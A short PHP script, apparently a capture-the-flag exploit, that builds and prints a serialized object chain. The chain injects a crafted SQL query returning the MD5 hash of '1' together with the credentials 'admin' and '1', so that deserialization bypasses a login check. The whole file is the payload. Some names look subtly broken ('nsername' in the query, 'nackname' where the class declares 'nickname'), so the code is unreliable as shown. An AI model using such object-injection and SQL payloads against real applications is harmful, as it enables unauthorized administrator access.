<?php
error_reporting(0);
session_start();
class User{
    public $age=null;
    public $nickname=null;
    public function __construct(){
        $this->age='select 1,c4ca4238a0b923820dcc509a6f75849b from user where nsername=?';
        $this->nackname=new Info();
    }
}
class Info{
    public $CtrlCase;
    public function __construct(){
        $this->CtrlCase=new dbCtrl();
    }
}
class UpdateHelper{
    public $sql;
    public function __construct(){
        $this->sql=new User();
    }
}
class dbCtrl{
    public $name='admin';
    public $password='1';
}
$c =new UpdateHelper();
echo serialize($c); 